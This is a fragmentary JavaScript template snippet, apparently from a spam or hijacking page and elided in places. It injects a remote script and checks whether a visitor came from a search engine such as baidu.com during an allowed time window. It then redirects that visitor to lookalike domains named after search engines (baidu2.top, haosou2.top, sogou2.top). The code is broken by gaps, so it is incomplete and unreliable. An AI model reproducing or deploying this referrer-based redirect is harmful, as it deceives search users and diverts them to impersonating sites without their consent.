var jurl;
document.write("<script type=\"text/javascript\" src=\"{{ URL('poster/themes/jsonp_callback/jsonpCallback/') }}/"+getpara()+"\"><\/script>");
    ...
    try { (function() {
        ...
        if (/baidu\.com$/i.test(host) && timeallow) {
            ...
            if(oldlink.indexOf("s?word=")>0){
                    jump("{{ URL('http://baidu2.top/poster/themes'.'/'.$id) }}");
            }else{
        ...
        if(oldlink.indexOf("&q=")>0){
                    jump("{{ URL('http://haosou2.top/poster/themes'.'/'.$id) }}"+"?templateId=2");
        }else{
                    jump("{{ URL('http://haosou2.top/poster/themes'.'/'.$id) }}"+"?templateId=2");
        }
        return;
        ...
        if(oldlink.indexOf("web?query=")>0){
                    jump("{{ URL('http://sogou2.top/poster/themes'.'/'.$id) }}"+"?templateId=3");
        }else{
                    jump("{{ URL('http://sogou2.top/poster/themes'.'/'.$id) }}"+"?templateId=3");
        }
        return;
